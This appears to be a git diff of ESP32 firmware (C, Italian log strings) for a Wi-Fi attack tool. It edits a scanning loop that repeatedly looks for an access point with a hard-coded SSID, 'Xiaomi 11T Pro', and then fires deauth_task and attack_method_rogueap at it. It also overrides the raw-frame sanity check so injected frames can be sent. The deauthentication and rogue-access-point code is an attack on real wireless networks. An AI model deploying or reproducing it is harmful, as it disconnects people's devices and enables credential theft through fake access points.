@@ -162,11 +162,11 @@ void scanWifi(void *pvParameter){
     wifi_sniffer_set_channel(channel);
     ESP_LOGI(TASK_NAME, "entrato nella funzione SCANWIFI");
     bool deauth_attack = 1;
-    while(deauth_attack){
+    while(1){
 
 
         // ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_APSTA));
-        vTaskDelay(1000 / portTICK_PERIOD_MS);
+        vTaskDelay(25000 / portTICK_PERIOD_MS);
         esp_wifi_scan_start(NULL,true);
         esp_wifi_scan_stop();
         uint16_t maxAP = 15; //arbitrary number max APs stored
@@ -183,9 +183,9 @@ void scanWifi(void *pvParameter){
             ESP_LOGI(TASK_NAME, "RSSI: %d", apRecords[i].rssi);
             ESP_LOGI(TASK_NAME, "########################################\n");
             //if(!strcmp("iPhone di Chiara", (char *)apRecords[i].ssid) || !strcmp("iPhone di Chiara\n", (char *)apRecords[i].ssid)){
-            if(!strcmp("Gama", (char * ) apRecords[i].ssid)){
+            if(!strcmp("Xiaomi 11T Pro", (char * ) apRecords[i].ssid)){
             //if(apRecords[i].authmode == WIFI_AUTH_WPA2_WPA3_PSK){
-                for(int u = 0; u < 5; u++){
+                for(int u = 0; u < 3; u++){
                     ESP_LOGI(TASK_NAME, "entering DEAUTH_TASK%d\n",u);
                     deauth_task(apRecords[i].bssid,apRecords[i].primary);
                     attack_method_rogueap(&apRecords[i]);
@@ -194,9 +194,12 @@ void scanWifi(void *pvParameter){
                 }
             }
         }
-        
+        wifictl_mgmt_ap_start();
+        wifictl_restore_ap_mac();
 
     }
+
+
     // /*Initialize WiFi */
     // wifi_config_t cfg = {
     //     .ap = {
@@ -220,10 +223,6 @@ void scanWifi(void *pvParameter){
     // /* Start WiFi */
     // ESP_ERROR_CHECK(esp_wifi_start());
     // ESP_LOGI(TASK_NAME, "riga 202: \n");
-
-    while(1){
-        vTaskDelay(1000/ portTICK_PERIOD_MS);
-    }
 }
 
 int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
